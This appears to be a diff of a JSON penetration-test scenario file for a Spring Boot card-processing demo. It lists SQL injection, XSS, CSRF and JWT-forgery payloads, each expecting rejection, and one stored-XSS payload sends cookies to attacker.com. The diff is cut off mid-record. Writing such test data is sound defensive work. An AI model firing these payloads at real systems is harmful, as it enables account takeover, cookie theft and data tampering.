@@ -1,905 +1,712 @@
 {
   "metadata": {
-    "description": "Comprehensive penetration testing scenarios for CardDemo Spring Boot microservices security validation",
+    "name": "CardDemo Security Penetration Testing Scenarios",
     "version": "1.0.0",
+    "description": "Comprehensive penetration testing scenarios for Spring Security implementation validation through simulated attacks, vulnerability exploitation attempts, and security control effectiveness testing",
     "created_date": "2024-07-27",
     "compliance_frameworks": [
+      "OWASP Top 10 2021",
       "PCI DSS 3.2.1",
       "SOX Section 404",
-      "GDPR Article 32"
+      "NIST Cybersecurity Framework"
     ],
-    "target_architecture": "Spring Boot 3.2.x microservices with PostgreSQL 15+ and Redis 7+",
-    "security_framework": "Spring Security 6.x with JWT authentication",
-    "testing_methodology": "OWASP ASVS 4.0 and OWASP Top 10 2021"
+    "target_system": "CardDemo Spring Boot Microservices with JWT Authentication",
+    "test_environment": "integration",
+    "severity_tolerance": {
+      "critical": 0,
+      "high": 0,
+      "medium": 5,
+      "low": 20
+    }
   },
 
   "PenetrationTestScenarios": {
-    "description": "Primary penetration testing scenarios providing comprehensive security validation through simulated attacks and vulnerability exploitation attempts",
+    "description": "Primary export containing comprehensive security validation scenarios for Spring Security protection mechanisms",
     
     "sql_injection_attack_scenarios": {
-      "description": "SQL injection vulnerability testing against Spring Data JPA repositories and PostgreSQL database",
-      "test_framework": "OWASP ZAP 2.16.1 with custom payload generation",
-      "target_components": ["AuthenticationService", "SecurityConfig", "JPA repositories"],
-      
-      "basic_sql_injection_tests": [
+      "description": "SQL injection vulnerability testing targeting authentication and data access endpoints",
+      "severity": "CRITICAL",
+      "attack_vectors": [
         {
-          "test_name": "Authentication Bypass via SQL Injection",
+          "scenario_name": "Authentication Bypass SQL Injection",
           "target_endpoint": "/api/auth/login",
           "http_method": "POST",
-          "vulnerability_type": "SQL_INJECTION_AUTHENTICATION_BYPASS",
+          "description": "Test SQL injection attempts in login credentials to bypass authentication controls",
           "test_payloads": [
             {
-              "username": "admin' OR '1'='1' --",
-              "password": "password",
-              "expected_response": 401,
-              "expected_behavior": "Spring Security validation blocks malicious input before database interaction"
+              "payload_name": "Classic SQL Injection",
+              "request_body": {
+                "username": "admin' OR '1'='1' --",
+                "password": "password"
+              },
+              "expected_response": {
+                "status_code": 401,
+                "error_code": "AUTHENTICATION_FAILED",
+                "security_behavior": "BLOCKED_BY_PREPARED_STATEMENTS"
+              },
+              "validation_criteria": [
+                "No successful authentication",
+                "Error logged in security audit",
+                "No database structure exposure",
+                "Standard error message returned"
+              ]
             },
             {
-              "username": "'; DROP TABLE users; --",
-              "password": "password123",
-              "expected_response": 400,
-              "expected_behavior": "JSR-303 validation prevents SQL injection through input sanitization"
+              "payload_name": "Union-Based SQL Injection",
+              "request_body": {
+                "username": "test' UNION SELECT 'admin','password','A','Test','User' --",
+                "password": "password"
+              },
+              "expected_response": {
+                "status_code": 401,
+                "security_behavior": "BLOCKED_BY_JPA_REPOSITORY"
+              }
             },
             {
-              "username": "admin' UNION SELECT username, password FROM users WHERE username='admin' --",
-              "password": "test",
-              "expected_response": 401,
-              "expected_behavior": "Parameterized queries prevent union-based SQL injection"
+              "payload_name": "Boolean-Based Blind SQL Injection",
+              "request_body": {
+                "username": "admin' AND (SELECT COUNT(*) FROM users) > 0 --",
+                "password": "password"
+              },  
+              "expected_response": {
+                "status_code": 401,
+                "security_behavior": "NO_INFORMATION_DISCLOSURE"
+              }
+            },
+            {
+              "payload_name": "Time-Based Blind SQL Injection",
+              "request_body": {
+                "username": "admin'; WAITFOR DELAY '00:00:05' --",
+                "password": "password"
+              },
+              "expected_response": {
+                "status_code": 401,
+                "response_time_max": "200ms",
+                "security_behavior": "NO_TIME_DELAY_EXECUTED"
+              }
             }
-          ],
-          "security_controls_tested": [
-            "Input validation through @Valid annotations",
-            "Parameterized JPA queries prevent SQL injection",
-            "Spring Security authentication filter validation"
           ]
         },
         {
-          "test_name": "Account View SQL Injection via Path Parameters",
+          "scenario_name": "Account Data Access SQL Injection",
           "target_endpoint": "/api/account/view/{accountId}",
           "http_method": "GET",
-          "vulnerability_type": "SQL_INJECTION_PATH_PARAMETER",
           "authentication_required": true,
           "test_payloads": [
             {
-              "account_id": "123456789' OR '1'='1",
-              "authorization_header": "Bearer {{valid_jwt_token}}",
-              "expected_response": 400,
-              "expected_behavior": "Path variable validation prevents SQL injection in repository queries"
+              "payload_name": "Path Parameter SQL Injection",
+              "path_parameter": "123456' OR '1'='1",
+              "headers": {
+                "Authorization": "Bearer valid_jwt_token"
+              },
+              "expected_response": {
+                "status_code": 404,
+                "security_behavior": "PARAMETER_VALIDATION_BLOCKED"
+              }
             },
             {
-              "account_id": "0'; WAITFOR DELAY '00:00:05' --",
-              "authorization_header": "Bearer {{valid_jwt_token}}",
-              "expected_response": 400,
-              "expected_behavior": "Time-based SQL injection blocked by input validation"
-            },
-            {
-              "account_id": "999999999999999999999",
-              "authorization_header": "Bearer {{valid_jwt_token}}",
-              "expected_response": 404,
-              "expected_behavior": "BigInteger overflow handling prevents database errors"
+              "payload_name": "Second-Order SQL Injection",
+              "path_parameter": "123456'; UPDATE accounts SET balance=999999 WHERE account_id='123456",
+              "expected_response": {
+                "status_code": 400,
+                "security_behavior": "INPUT_SANITIZATION_ACTIVE"
+              }
             }
-          ],
-          "security_controls_tested": [
-            "@PathVariable validation with custom constraints",
-            "JPA repository method parameter validation",
-            "Database transaction isolation level protection"
           ]
-        }
-      ],
-
-      "blind_sql_injection_tests": [
+        },
         {
-          "test_name": "User Management Blind SQL Injection",
+          "scenario_name": "User Management SQL Injection",
           "target_endpoint": "/api/users/{userId}",
           "http_method": "GET",
-          "vulnerability_type": "BLIND_SQL_INJECTION",
-          "authentication_required": true,
           "required_role": "ROLE_ADMIN",
           "test_payloads": [
             {
-              "user_id": "ADMIN' AND (SELECT COUNT(*) FROM users WHERE username='admin') = 1 --",
-              "authorization_header": "Bearer {{admin_jwt_token}}",
-              "expected_response": 400,
-              "expected_behavior": "Spring Data JPA query validation prevents blind SQL injection attempts"
-            },
-            {
-              "user_id": "TEST' AND (SELECT SUBSTRING(version(), 1, 1)) = '1",
-              "authorization_header": "Bearer {{admin_jwt_token}}",
-              "expected_response": 400,
-              "expected_behavior": "Database version information disclosure prevented by validation"
-            }
-          ],
-          "security_controls_tested": [
-            "Role-based access control via @PreAuthorize",
-            "Named parameter queries in custom repository methods",
-            "PostgreSQL prepared statement protection"
-          ]
-        }
-      ],
-
-      "stored_procedure_injection_tests": [
-        {
-          "test_name": "Transaction Processing SQL Injection",
-          "target_endpoint": "/api/transaction/add",
-          "http_method": "POST",
-          "vulnerability_type": "SQL_INJECTION_JSON_PAYLOAD",
-          "authentication_required": true,
-          "test_payloads": [
-            {
-              "request_body": {
-                "accountId": "123456789'; DELETE FROM transactions; --",
-                "amount": "100.00",
-                "transactionType": "DEBIT"
+              "payload_name": "Admin Privilege SQL Injection",
+              "path_parameter": "TESTUSER' UNION SELECT password_hash FROM users WHERE user_type='A' --",
+              "headers": {
+                "Authorization": "Bearer admin_jwt_token"
               },
-              "authorization_header": "Bearer {{valid_jwt_token}}",
-              "expected_response": 400,
-              "expected_behavior": "JSON validation and BigDecimal parsing prevents SQL injection"
-            },
-            {
-              "request_body": {
-                "accountId": "123456789",
-                "amount": "100.00' OR '1'='1",
-                "transactionType": "CREDIT"
-              },
-              "authorization_header": "Bearer {{valid_jwt_token}}",
-              "expected_response": 400,
-              "expected_behavior": "BigDecimal type conversion blocks string-based SQL injection"
+              "expected_response": {
+                "status_code": 404,
+                "security_behavior": "JPA_QUERY_PROTECTION"
+              }
             }
-          ],
-          "security_controls_tested": [
-            "@Transactional annotation ensures transaction integrity",
-            "BigDecimal validation prevents numeric SQL injection",
-            "Spring MVC JSON deserialization with type safety"
           ]
         }
       ]
     },
 
     "xss_vulnerability_testing": {
-      "description": "Cross-Site Scripting (XSS) vulnerability assessment for React frontend and API responses",
-      "test_framework": "OWASP ZAP XSS scanning with custom payload validation",
-      "target_components": ["React frontend", "REST API responses", "Error handling"],
-
-      "reflected_xss_tests": [
+      "description": "Cross-Site Scripting attack simulation testing for input validation and output encoding",
+      "severity": "HIGH",
+      "attack_vectors": [
         {
-          "test_name": "Authentication Error Message XSS",
+          "scenario_name": "Reflected XSS in Authentication",
           "target_endpoint": "/api/auth/login",
           "http_method": "POST",
-          "vulnerability_type": "REFLECTED_XSS",
           "test_payloads": [
             {
-              "username": "<script>alert('XSS')</script>",
-              "password": "password",
-              "expected_response": 401,
-              "expected_behavior": "Error messages are properly encoded and do not execute JavaScript"
+              "payload_name": "Script Tag Injection",
+              "request_body": {
+                "username": "<script>alert('XSS_ATTACK')</script>",
+                "password": "test"
+              },
+              "expected_response": {
+                "status_code": 401,
+                "response_validation": [
+                  "No script execution in response",
+                  "Input sanitized in error messages",
+                  "Content-Type: application/json enforced"
+                ]
+              }
             },
             {
-              "username": "<img src=x onerror=alert('XSS')>",
-              "password": "test",
-              "expected_response": 401,
-              "expected_behavior": "HTML entities are escaped in JSON error responses"
+              "payload_name": "HTML Entity Injection",
+              "request_body": {
+                "username": "<img src=x onerror=alert('XSS')>",
+                "password": "test"
+              },
+              "expected_response": {
+                "status_code": 401,
+                "security_behavior": "HTML_ENTITIES_ENCODED"
+              }
             },
             {
-              "username": "javascript:alert('XSS')",
-              "password": "test",
-              "expected_response": 401,
-              "expected_behavior": "JavaScript protocol handlers are neutralized"
+              "payload_name": "JavaScript URL Injection",
+              "request_body": {
+                "username": "javascript:alert('XSS')",
+                "password": "test"
+              },
+              "expected_response": {
+                "status_code": 401,
+                "security_behavior": "URL_VALIDATION_BLOCKED"
+              }
             }
-          ],
-          "security_controls_tested": [
-            "JSON response encoding prevents XSS in error messages",
-            "Spring MVC input validation with HTML escaping",
-            "Content-Security-Policy headers block inline scripts"
           ]
         },
         {
-          "test_name": "Account Data XSS via API Response",
-          "target_endpoint": "/api/account/view/{accountId}",
-          "http_method": "GET",
-          "vulnerability_type": "REFLECTED_XSS_API_RESPONSE",
-          "authentication_required": true,
-          "test_payloads": [
-            {
-              "account_id": "123456789",
-              "authorization_header": "Bearer {{valid_jwt_token}}",
-              "manipulated_data": {
-                "account_name": "<svg onload=alert('XSS')>",
-                "account_description": "<iframe src=javascript:alert('XSS')></iframe>"
-              },
-              "expected_response": 200,
-              "expected_behavior": "Account data is JSON-encoded and HTML-escaped in responses"
-            }
-          ],
-          "security_controls_tested": [
-            "Jackson JSON serialization with HTML escaping",
-            "Spring Security content type validation",
-            "React frontend XSS protection via dangerouslySetInnerHTML avoidance"
-          ]
-        }
-      ],
-
-      "stored_xss_tests": [
-        {
-          "test_name": "User Profile Stored XSS",
+          "scenario_name": "Stored XSS via User Profile",
           "target_endpoint": "/api/users",
           "http_method": "POST",
-          "vulnerability_type": "STORED_XSS",
-          "authentication_required": true,
           "required_role": "ROLE_ADMIN",
           "test_payloads": [
             {
+              "payload_name": "Persistent Script Storage",
               "request_body": {
-                "userId": "TESTXSS",
+                "userId": "TESTUSER",
                 "firstName": "<script>document.location='http://attacker.com/'+document.cookie</script>",
-                "lastName": "User",
-                "password": "Password123",
+                "lastName": "Test",
                 "userType": "U"
               },
-              "authorization_header": "Bearer {{admin_jwt_token}}",
-              "expected_response": 201,
-              "verification_endpoint": "/api/users/TESTXSS",
-              "expected_behavior": "Stored XSS payload is neutralized through database encoding and output escaping"
+              "expected_response": {
+                "status_code": 400,
+                "security_behavior": "INPUT_VALIDATION_REJECTED"
+              }
             }
-          ],
-          "security_controls_tested": [
-            "PostgreSQL text column storage prevents script execution",
-            "JPA entity validation with @Pattern annotations",
-            "REST controller output encoding for JSON responses"
-          ]
-        }
-      ],
-
-      "dom_xss_tests": [
-        {
-          "test_name": "React Component DOM XSS",
-          "target_component": "LoginComponent",
-          "vulnerability_type": "DOM_XSS",
-          "test_scenarios": [
-            {
-              "test_case": "URL fragment XSS",
-              "test_url": "http://localhost:3000/login#<script>alert('XSS')</script>",
-              "expected_behavior": "React Router does not render URL fragments as HTML"
-            },
-            {
-              "test_case": "LocalStorage XSS",
-              "storage_manipulation": {
-                "key": "jwt_token",
-                "value": "<img src=x onerror=alert('XSS')>"
-              },
-              "expected_behavior": "JWT validation prevents malicious token processing"
-            }
-          ],
-          "security_controls_tested": [
-            "React XSS protection through JSX automatic escaping",
-            "Content Security Policy prevents inline script execution",
-            "JWT signature validation prevents token manipulation"
           ]
         }
       ]
     },
 
     "csrf_attack_simulation": {
-      "description": "Cross-Site Request Forgery (CSRF) attack simulation testing CSRF protection mechanisms",
-      "test_framework": "Custom CSRF attack simulation with CsrfSecurityConfig validation",
-      "target_components": ["CsrfSecurityConfig", "React frontend", "State-changing endpoints"],
-
-      "csrf_token_validation_tests": [
+      "description": "Cross-Site Request Forgery attack testing to validate CSRF protection mechanisms",
+      "severity": "HIGH",
+      "attack_vectors": [
         {
-          "test_name": "Missing CSRF Token Attack",
-          "target_endpoint": "/api/users",
-          "http_method": "POST",
-          "vulnerability_type": "CSRF_MISSING_TOKEN",
-          "authentication_required": true,
-          "test_scenarios": [
-            {
-              "request_headers": {
-                "Authorization": "Bearer {{admin_jwt_token}}",
-                "Content-Type": "application/json"
-              },
-              "request_body": {
-                "userId": "MALICIOUS",
-                "password": "password123",
-                "userType": "A"
-              },
-              "csrf_token_included": false,
-              "expected_response": 403,
-              "expected_behavior": "CsrfSecurityConfig blocks requests without valid CSRF token"
-            }
-          ],
-          "security_controls_tested": [
-            "CookieCsrfTokenRepository validates double-submit cookie pattern",
-            "XorCsrfTokenRequestAttributeHandler provides additional token protection",
-            "Custom CsrfHeaderFilter enforces header-based CSRF validation"
-          ]
-        },
-        {
-          "test_name": "Invalid CSRF Token Attack",
-          "target_endpoint": "/api/accounts/{accountId}",
+          "scenario_name": "CSRF Token Bypass Attempts",
+          "target_endpoint": "/api/account/update/123456",
           "http_method": "PUT",
-          "vulnerability_type": "CSRF_INVALID_TOKEN",
           "authentication_required": true,
-          "test_scenarios": [
+          "test_payloads": [
             {
-              "path_parameters": {
-                "accountId": "123456789"
-              },
-              "request_headers": {
-                "Authorization": "Bearer {{valid_jwt_token}}",
-                "Content-Type": "application/json",
-                "X-XSRF-TOKEN": "invalid_csrf_token_value"
+              "payload_name": "Missing CSRF Token",
+              "headers": {
+                "Authorization": "Bearer valid_jwt_token",
+                "Content-Type": "application/json"
               },
               "request_body": {
                 "accountBalance": "999999.99"
               },
-              "csrf_cookie": "XSRF-TOKEN=different_csrf_token_value",
-              "expected_response": 403,
-              "expected_behavior": "Double-submit cookie validation detects token mismatch"
-            }
-          ],
-          "security_controls_tested": [
-            "CSRF token header and cookie comparison validation",
-            "Token mismatch logging for security monitoring",
-            "Structured JSON error response for React frontend"
-          ]
-        }
-      ],
-
-      "csrf_bypass_attempts": [
-        {
-          "test_name": "Content-Type CSRF Bypass Attempt",
-          "target_endpoint": "/api/transaction/add",
-          "http_method": "POST",
-          "vulnerability_type": "CSRF_CONTENT_TYPE_BYPASS",
-          "test_scenarios": [
-            {
-              "request_headers": {
-                "Authorization": "Bearer {{valid_jwt_token}}",
-                "Content-Type": "text/plain"
-              },
-              "request_body": "{\"accountId\": \"123456789\", \"amount\": \"1000000.00\", \"transactionType\": \"CREDIT\"}",
-              "expected_response": 403,
-              "expected_behavior": "Content-Type validation prevents CSRF bypass through alternative content types"
+              "expected_response": {
+                "status_code": 403,
+                "error_code": "CSRF_TOKEN_INVALID",
+                "security_behavior": "CSRF_PROTECTION_ACTIVE"
+              }
             },
             {
-              "request_headers": {
-                "Authorization": "Bearer {{valid_jwt_token}}",
-                "Content-Type": "application/x-www-form-urlencoded"
-              },
-              "request_body": "accountId=123456789&amount=1000000.00&transactionType=CREDIT",
-              "expected_response": 403,
-              "expected_behavior": "CSRF protection applies to all state-changing content types"
-            }
-          ],
-          "security_controls_tested": [
-            "Content-Type specific CSRF validation",
-            "Request method filtering for CSRF enforcement",
-            "Origin header validation for cross-origin request detection"
-          ]
-        }
-      ],
-
-      "csrf_protection_exclusion_tests": [
-        {
-          "test_name": "JWT API Endpoint CSRF Exclusion",
-          "description": "Verify that stateless JWT API endpoints are properly excluded from CSRF protection",
-          "test_scenarios": [
-            {
-              "target_endpoint": "/api/auth/login",
-              "http_method": "POST",
-              "request_headers": {
+              "payload_name": "Invalid CSRF Token",
+              "headers": {
+                "Authorization": "Bearer valid_jwt_token",
+                "X-XSRF-TOKEN": "invalid_csrf_token_12345",
                 "Content-Type": "application/json"
               },
               "request_body": {
-                "username": "testuser",
-                "password": "password123"
+                "accountBalance": "999999.99"
               },
-              "csrf_token_included": false,
-              "expected_response": 401,
-              "expected_behavior": "Authentication endpoints excluded from CSRF protection per configuration"
+              "expected_response": {
+                "status_code": 403,
+                "error_code": "CSRF_TOKEN_INVALID"
+              }
             },
             {
-              "target_endpoint": "/actuator/health",
-              "http_method": "GET",
-              "csrf_token_included": false,
-              "expected_response": 200,
-              "expected_behavior": "Actuator endpoints excluded from CSRF protection for monitoring"
+              "payload_name": "CSRF Token Reuse Attack",
+              "headers": {
+                "Authorization": "Bearer valid_jwt_token",
+                "X-XSRF-TOKEN": "previously_used_csrf_token",
+                "Content-Type": "application/json"
+              },
+              "request_body": {
+                "accountBalance": "999999.99"
+              },
+              "expected_response": {
+                "status_code": 403,
+                "security_behavior": "TOKEN_REPLAY_PROTECTION"
+              }
             }
-          ],
-          "security_controls_tested": [
-            "CSRF ignored paths configuration validation",
-            "Stateless vs stateful endpoint differentiation",
-            "Selective CSRF enforcement based on request patterns"
+          ]
+        },
+        {
+          "scenario_name": "Cross-Origin CSRF Attacks",
+          "target_endpoint": "/api/transaction/add",
+          "http_method": "POST",
+          "test_payloads": [
+            {
+              "payload_name": "Malicious Origin Request",
+              "headers": {
+                "Authorization": "Bearer valid_jwt_token",
+                "Origin": "https://malicious-site.com",
+                "Content-Type": "application/json"
+              },
+              "request_body": {
+                "accountId": "123456789",
+                "amount": "1000000.00",
+                "transactionType": "DEBIT"
+              },
+              "expected_response": {
+                "status_code": 403,
+                "security_behavior": "CORS_PROTECTION_BLOCKED"
+              }
+            }
           ]
         }
       ]
     },
 
     "authentication_bypass_attempts": {
-      "description": "Authentication bypass testing through JWT token manipulation and session hijacking scenarios",
-      "test_framework": "Custom JWT manipulation with Spring Security validation testing",
-      "target_components": ["AuthenticationService", "JwtAuthenticationFilter", "SecurityConfig"],
-
-      "jwt_token_manipulation_tests": [
+      "description": "Authentication bypass testing through various attack vectors and token manipulation",
+      "severity": "CRITICAL",
+      "attack_vectors": [
         {
-          "test_name": "JWT Algorithm Confusion Attack",
-          "vulnerability_type": "JWT_ALGORITHM_CONFUSION", 
-          "test_scenarios": [
+          "scenario_name": "JWT Token Manipulation",
+          "target_endpoint": "/api/account/view/123456",
+          "http_method": "GET",
+          "test_payloads": [
             {
-              "attack_description": "Change HS256 to RS256 to bypass signature validation",
-              "manipulated_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJNQUxJQ0lPVVMiLCJ1c2VyVHlwZSI6IkEiLCJyb2xlIjoiUk9MRV9BRE1JTiIsInNlc3Npb25JZCI6IkhBQ0tFRF9TRVNTSU9OIiwiZmlyc3ROYW1lIjoiTWFsaWNpb3VzIiwibGFzdE5hbWUiOiJBdHRhY2tlciIsImlzcyI6IkNhcmREZW1vLUF1dGgtU2VydmljZSIsImlhdCI6MTcyMjEwNDQwMCwiZXhwIjoxNzIyMTA2MjAwfQ.FAKE_RSA_SIGNATURE_FOR_ALGORITHM_CONFUSION",
-              "target_endpoints": ["/api/users", "/api/account/view/123456789"],
-              "expected_response": 401,
-              "expected_behavior": "JwtDecoder enforces HS256 algorithm and rejects algorithm confusion attempts"
-            }
-          ],
-          "security_controls_tested": [
-            "Nimbus JWT decoder algorithm enforcement",
-            "JWT signature validation with fixed algorithm",
-            "Spring Security JWT authentication filter validation"
-          ]
-        },
-        {
-          "test_name": "JWT Signature Bypass Attempt",
-          "vulnerability_type": "JWT_SIGNATURE_BYPASS",
-          "test_scenarios": [
-            {
-              "attack_description": "Remove signature from JWT token",
-              "manipulated_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJNQUxJQ0lPVVMiLCJ1c2VyVHlwZSI6IkEiLCJyb2xlIjoiUk9MRV9BRE1JTiJ9.",
-              "target_endpoints": ["/api/users", "/api/admin/settings"],
-              "expected_response": 401,
-              "expected_behavior": "JWT validation requires valid signature and rejects unsigned tokens"
-            },
-            {
-              "attack_description": "Modify claims and resign with known weak key",
-              "manipulated_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIiwic2Vzc2lvbklkIjoiRkFLRV9TRVNTSU9OIiwiZmlyc3ROYW1lIjoiRmFrZSIsImxhc3ROYW1lIjoiQWRtaW4iLCJpc3MiOiJDYXJkRGVtby1BdXRoLVNlcnZpY2UiLCJpYXQiOjE3MjIxMDQ0MDAsImV4cCI6MTc0MjEwNjIwMH0.WEAK_KEY_SIGNATURE_ATTEMPT",
-              "target_endpoints": ["/api/users"],
-              "expected_response": 401,
-              "expected_behavior": "JWT secret key strength (minimum 32 bytes) prevents weak key attacks"
-            }
-          ],
-          "security_controls_tested": [
-            "JWT secret key minimum length validation (32 bytes)",
-            "Signature verification with secure HMAC-SHA256",
-            "Token expiration validation prevents long-lived malicious tokens"
-          ]
-        },
-        {
-          "test_name": "JWT Claims Manipulation",
-          "vulnerability_type": "JWT_CLAIMS_MANIPULATION",
-          "test_scenarios": [
-            {
-              "attack_description": "Elevate user role from USER to ADMIN",
-              "base_token": "{{valid_user_token}}",
-              "claim_modifications": {
-                "role": "ROLE_ADMIN",
-                "userType": "A"
+              "payload_name": "Algorithm Confusion Attack",
+              "headers": {
+                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIn0."
               },
-              "target_endpoints": ["/api/users", "/api/users/TESTUSER"],
-              "expected_response": 401,
-              "expected_behavior": "JWT signature validation prevents claims modification without key knowledge"
+              "description": "Attempt to bypass signature verification by setting algorithm to 'none'",
+              "expected_response": {
+                "status_code": 401,
+                "error_code": "JWT_TOKEN_INVALID",
+                "security_behavior": "ALGORITHM_VALIDATION_ENFORCED"
+              }
             },
             {
-              "attack_description": "Extend token expiration",
-              "base_token": "{{valid_user_token}}",
-              "claim_modifications": {
+              "payload_name": "Signature Bypass Attempt",
+              "headers": {
+                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIiwiaWF0IjoxNzIyMTA0NDAwLCJleHAiOjk5OTk5OTk5OTl9.TAMPERED_SIGNATURE"
+              },
+              "description": "Tamper with JWT signature to test signature validation",
+              "expected_response": {
+                "status_code": 401,
+                "security_behavior": "SIGNATURE_VALIDATION_FAILED"
+              }
+            },
+            {
+              "payload_name": "Claims Manipulation",
+              "headers": {
+                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIiwiaWF0IjoxNzIyMTA0NDAwLCJleHAiOjk5OTk5OTk5OTl9.invalid_signature_for_modified_claims"
+              },
+              "description": "Attempt to escalate privileges by modifying user type claim",
+              "expected_response": {
+                "status_code": 401,
+                "security_behavior": "SIGNATURE_MISMATCH_DETECTED"
+              }
+            },
+            {
+              "payload_name": "Expired Token Usage",
+              "headers": {
+                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiVSIsInJvbGUiOiJST0xFX1VTRVIiLCJpYXQiOjE3MDUzMTI4MDAsImV4cCI6MTcwNTMxNDYwMH0.expired_token_signature"
+              },
+              "description": "Test expired token rejection",
+              "expected_response": {
+                "status_code": 401,
+                "error_code": "JWT_TOKEN_EXPIRED",
+                "security_behavior": "EXPIRATION_VALIDATION_ACTIVE"
+              }
+            }
+          ]
+        },
+        {
+          "scenario_name": "Authorization Header Bypass",
+          "target_endpoint": "/api/users",
+          "http_method": "GET",
+          "required_role": "ROLE_ADMIN",
+          "test_payloads": [
+            {
+              "payload_name": "Missing Authorization Header",
+              "headers": {},
+              "expected_response": {
+                "status_code": 401,
+                "error_code": "JWT_TOKEN_MISSING"
+              }
+            },
+            {
+              "payload_name": "Invalid Bearer Format",
+              "headers": {
+                "Authorization": "InvalidPrefix eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
+              },
+              "expected_response": {
+                "status_code": 401,
+                "security_behavior": "BEARER_FORMAT_VALIDATION"
+              }
+            },
+            {
+              "payload_name": "Empty Bearer Token",
+              "headers": {
+                "Authorization": "Bearer "
+              },
+              "expected_response": {
+                "status_code": 401,
+                "security_behavior": "EMPTY_TOKEN_REJECTED"
+              }
+            }
+          ]
+        }
+      ]
+    },
+
+    "session_hijacking_scenarios": {
+      "description": "Session management security testing including token theft and session fixation attacks",
+      "severity": "HIGH",
+      "attack_vectors": [
+        {
+          "scenario_name": "JWT Token Theft Simulation",
+          "test_payloads": [
+            {
+              "payload_name": "Token Replay Attack",
+              "description": "Test if stolen JWT tokens can be reused from different IP addresses",
+              "attack_flow": [
+                {
+                  "step": 1,
+                  "action": "Legitimate user login",
+                  "endpoint": "/api/auth/login",
+                  "source_ip": "192.168.1.100"
+                },
+                {
+                  "step": 2,
+                  "action": "Token reuse from different IP",
+                  "endpoint": "/api/account/view/123456",
+                  "source_ip": "10.0.0.50",
+                  "headers": {
+                    "Authorization": "Bearer captured_jwt_token",
+                    "X-Forwarded-For": "10.0.0.50"
+                  }
+                }
+              ],
+              "expected_behavior": {
+                "security_monitoring": "IP_CHANGE_DETECTED",
+                "response_action": "SECURITY_ALERT_GENERATED",
+                "access_result": "CONDITIONAL_ACCESS_BASED_ON_POLICY"
+              }
+            }
+          ]
+        },
+        {
+          "scenario_name": "Session Fixation Attacks",
+          "test_payloads": [
+            {
+              "payload_name": "Pre-Authentication Session Fixation",
+              "description": "Test session management security during authentication flow",
+              "attack_flow": [
+                {
+                  "step": 1,
+                  "action": "Obtain session identifier",
+                  "endpoint": "/api/auth/login",
+                  "method": "GET"
+                },
+                {
+                  "step": 2,
+                  "action": "Force victim to use fixed session",
+                  "endpoint": "/api/auth/login",
+                  "method": "POST",
+                  "request_body": {
+                    "username": "TESTUSER",
+                    "password": "password123"
+                  },
+                  "headers": {
+                    "X-Session-ID": "attacker_controlled_session_id"
+                  }
+                }
+              ],
+              "expected_response": {
+                "status_code": 200,
+                "security_behavior": "NEW_SESSION_ID_GENERATED",
+                "validation": "SESSION_ID_REGENERATION_ON_AUTH"
+              }
+            }
+          ]
+        }
+      ]
+    },
+
+    "jwt_token_manipulation_tests": {
+      "description": "Comprehensive JWT token security testing including cryptographic attacks and claim validation",
+      "severity": "CRITICAL", 
+      "attack_vectors": [
+        {
+          "scenario_name": "JWT Algorithm Attacks",
+          "test_payloads": [
+            {
+              "payload_name": "RS256 to HS256 Algorithm Confusion",
+              "description": "Attempt to exploit algorithm confusion vulnerability",
+              "malicious_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIiwiaWF0IjoxNzIyMTA0NDAwLCJleHAiOjk5OTk5OTk5OTl9.public_key_as_hmac_secret",
+              "target_endpoint": "/api/users",
+              "expected_response": {
+                "status_code": 401,
+                "security_behavior": "ALGORITHM_VERIFICATION_ENFORCED"
+              }
+            },
+            {
+              "payload_name": "None Algorithm Bypass",
+              "description": "Test unsigned JWT token acceptance",
+              "malicious_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIn0.",
+              "target_endpoint": "/api/admin/dashboard",
+              "expected_response": {
+                "status_code": 401,
+                "security_behavior": "UNSIGNED_TOKEN_REJECTED"
+              }
+            }
+          ]
+        },
+        {
+          "scenario_name": "JWT Claim Manipulation",
+          "test_payloads": [
+            {
+              "payload_name": "User Type Privilege Escalation",
+              "description": "Attempt to change user type from 'U' to 'A' in JWT claims",
+              "original_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiVSIsInJvbGUiOiJST0xFX1VTRVIifQ.original_signature",
+              "tampered_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIn0.tampered_signature",
+              "target_endpoint": "/api/users",
+              "expected_response": {
+                "status_code": 401,
+                "security_behavior": "SIGNATURE_VALIDATION_FAILED"
+              }
+            },
+            {
+              "payload_name": "Expiration Time Extension",
+              "description": "Attempt to extend token expiration time",
+              "tampered_claims": {
+                "sub": "TESTUSER",
+                "userType": "U", 
+                "role": "ROLE_USER",
                 "exp": 9999999999
               },
-              "target_endpoints": ["/api/account/view/123456789"],
-              "expected_response": 401,
-              "expected_behavior": "Signature validation prevents expiration extension attacks"
+              "expected_response": {
+                "status_code": 401,
